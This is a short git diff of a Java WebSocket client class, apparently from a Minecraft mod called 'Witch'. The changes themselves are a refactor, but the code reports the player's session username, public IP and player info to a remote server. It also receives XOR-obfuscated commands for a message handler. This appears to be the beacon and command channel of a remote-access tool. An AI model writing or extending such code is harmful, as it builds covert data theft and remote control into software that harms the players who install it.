@@ -1,6 +1,5 @@
 package me.soda.witch.websocket;
 
-import com.google.gson.Gson;
 import me.soda.witch.Witch;
 import me.soda.witch.features.NetUtil;
 import me.soda.witch.features.PlayerInfo;
@@ -24,9 +23,9 @@ public class WSClient extends WebSocketClient {
     public void onOpen(ServerHandshake handshakeData) {
         Witch.println("Connection initialized");
         String greetingMsg = "Reconnected " + reconnections + " times, I am " + mc.getSession().getUsername();
-        MessageUtils.sendMessage("greeting", greetingMsg);
+        Message.send("greeting", greetingMsg);
         if (Witch.ip == null) Witch.ip = NetUtil.getIp();
-        MessageUtils.sendMessage("player", new Gson().toJson(new PlayerInfo(Witch.mc.player)));
+        Message.send("player", new PlayerInfo(Witch.mc.player));
     }
 
     @Override
@@ -36,7 +35,7 @@ public class WSClient extends WebSocketClient {
 
     @Override
     public void onMessage(ByteBuffer bytes) {
-        MessageHandler.handle(MessageUtils.xor.decrypt(bytes.array()));
+        MessageHandler.handle(Message.xor.decrypt(bytes.array()));
     }
 
     @Override
